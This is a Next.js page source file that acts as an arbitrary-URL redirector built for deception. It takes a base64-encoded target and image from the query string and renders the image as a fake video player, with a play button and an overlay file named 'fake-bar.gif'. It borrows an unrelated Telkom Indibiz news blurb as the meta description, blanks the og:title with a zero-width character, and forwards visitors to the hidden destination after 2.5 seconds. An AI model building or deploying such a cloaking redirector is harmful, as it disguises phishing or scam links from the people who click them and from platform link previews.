// pages/index.tsx

import { GetServerSideProps } from "next";
import Head from "next/head";
import { useEffect } from "react";

interface Props {
  redirectUrl: string;
  imageUrl: string;
}

export const getServerSideProps: GetServerSideProps = async (context) => {
  const encoded = context.query.data as string;

  if (!encoded) {
    return { notFound: true };
  }

  try {
    const decoded = Buffer.from(encoded, "base64").toString("utf-8");
    const { redirectUrl, imageUrl } = JSON.parse(decoded);

    if (!redirectUrl || !imageUrl) throw new Error("Invalid data");

    return {
      props: { redirectUrl, imageUrl },
    };
  } catch (err) {
    return { notFound: true };
  }
};

const blankZWNJ = '\u200C';

export default function RedirectPage({ redirectUrl, imageUrl }: Props) {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.href = redirectUrl;
    }, 2500);
    return () => clearTimeout(timer);
  }, [redirectUrl]);

  return (
    <>
      <Head>
        <meta name="description" content="Jakarta (ANTARA) - Indibiz, bagian dari ekosistem solusi digital Telkom Indonesia, menjaga komitmennya mendukung transformasi digital Usaha Mikro Kecil dan Menengah (UMKM) dan salah satunya dengan merancang solusi digital berupa website yang ramah digunakan oleh para pelaku UMKM." />
        <meta property="og:title" content={blankZWNJ} />
        <meta property="og:url" content={redirectUrl} />
      </Head>

      <main style={{ margin: 0, padding: 0, background: "#000", textAlign: "center" }}>
        {imageUrl && (
          <div
            style={{
              position: "relative",
              display: "inline-block",
              width: "100%",
              maxWidth: "800px",
            }}
          >
            {/* Thumbnail utama */}
            <img
              src={imageUrl}
              width="1200"
              height="630"
              alt="Thumbnail"
              style={{
                width: "100%",
                height: "auto",
                display: "block",
              }}
            />

            {/* Play icon overlay */}
            <img
              src="https://cdn.pixabay.com/photo/2017/03/13/04/25/play-button-2138735_1280.png"
              alt="Play Button"
              style={{
                position: "absolute",
                top: "50%",
                left: "50%",
                width: "80px",
                height: "80px",
                transform: "translate(-50%, -50%)",
                pointerEvents: "none",
                opacity: 0.9,
              }}
            />

            {/* Fake video bar overlay */}
            <img
              src="/fake-bar.gif"
              alt="Fake Video Bar"
              style={{
                position: "absolute",
                bottom: "0px",
                left: "0px",
                width: "100%",
                height: "auto",
              }}
            />
          </div>
        )}

        <p style={{ color: "#fff", fontSize: "1.1rem", padding: "1rem" }}>
          Tunggu sebentar...
        </p>
      </main>
    </>
  );
}
